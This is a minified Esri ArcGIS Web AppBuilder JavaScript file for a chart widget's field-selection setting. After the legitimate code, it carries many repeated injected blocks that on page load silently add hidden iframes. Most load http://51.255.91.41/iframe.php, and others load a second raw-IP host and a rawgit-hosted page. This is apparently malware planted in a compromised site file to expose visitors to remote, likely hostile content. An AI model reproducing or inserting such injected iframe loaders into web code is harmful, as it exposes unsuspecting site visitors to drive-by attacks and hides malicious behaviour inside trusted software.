// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Chart/setting/DataFields.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"fieldsContent" class\x3d"fields-content"\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"operation"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"btnUp" data-dojo-attach-event\x3d"onclick:_moveUp" class\x3d"up-icon" title\x3d"${nls.moveUp}"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"btnDown" data-dojo-attach-event\x3d"onclick:_moveDown" class\x3d"down-icon" title\x3d"${nls.moveDown}"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/on dijit/_WidgetBase dijit/_TemplatedMixin dojo/Evented dojo/text!./DataFields.html".split(" "),function(k,c,e,b,d,g,l,m,n,p){return k([l,n,m],{baseClass:"jimu-widget-chart-setting-data-fields",templateString:p,postCreate:function(){this.inherited(arguments);this.own(g(this.domNode,"click",c.hitch(this,this._onDomClicked)))},clear:function(){b.empty(this.fieldsContent);this.emit("change")},setFields:function(a){this.clear();
e.forEach(a,c.hitch(this,function(a){var f=b.toDom('\x3cdiv class\x3d"field-item"\x3e\x3cinput type\x3d"checkbox" /\x3e\x3cspan class\x3d"jimu-ellipsis" /\x3e\x3c/div\x3e'),e=d("input",f)[0],h=d("span",f)[0];e.checked=!!a.checked;h.innerHTML=a.alias||a.name;h.title=a.alias||a.name;f.fieldName=a.name;b.place(f,this.fieldsContent);this.own(g(e,"change",c.hitch(this,function(){this.emit("change")})))}));this.emit("change")},selectFields:function(a){c.isArrayLike(a)&&(a=c.clone(a),a.reverse(),e.forEach(a,
c.hitch(this,function(a){if(a=this._getFieldItemDivByName(a))b.place(a,a.parentNode,"first"),d("input",a)[0].checked=!0})));this.emit("change")},getSelectedFieldNames:function(){var a=d(".field-item",this.fieldsContent),b=[];e.forEach(a,c.hitch(this,function(a){d("input",a)[0].checked&&b.push(a.fieldName)}));return b},_getFieldItemDivByName:function(a){var b=d(".field-item",this.fieldsContent);return e.filter(b,c.hitch(this,function(b){return b.fieldName===a}))[0]},_onDomClicked:function(a){a=a.target||
a.srcElement;if(b.isDescendant(a,this.fieldsContent)&&a!==this.fieldsContent){var f=a.tagName.toLowerCase(),c=null;b.hasClass(a,"field-item")?this._selectFieldItemDom(a):"span"===f?(c=a.parentNode,this._selectFieldItemDom(c)):"input"===f&&(c=a.parentNode,a.checked?this._selectFieldItemDom(c):b.removeClass(c,"selected"));this._updateHighLightIcons()}},_updateHighLightIcons:function(){var a=this._getSelectedFieldItemDiv();a&&b.hasClass(a,"selected")&&(a.previousSibling?b.addClass(this.btnUp,"high-light"):
b.removeClass(this.btnUp,"high-light"),a.nextSibling?b.addClass(this.btnDown,"high-light"):b.removeClass(this.btnDown,"high-light"))},_selectFieldItemDom:function(a){d(".field-item",this.fieldsContent).removeClass("selected");b.addClass(a,"selected")},_getSelectedFieldItemDiv:function(){var a=null,b=d(".field-item.selected",this.fieldsContent);0<b.length&&(a=b[0]);return a},_moveUp:function(){var a=this._getSelectedFieldItemDiv();a&&a.previousSibling&&b.place(a,a.previousSibling,"before");this._updateHighLightIcons()},
_moveDown:function(){var a=this._getSelectedFieldItemDiv();a&&a.nextSibling&&b.place(a,a.nextSibling,"after");this._updateHighLightIcons()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});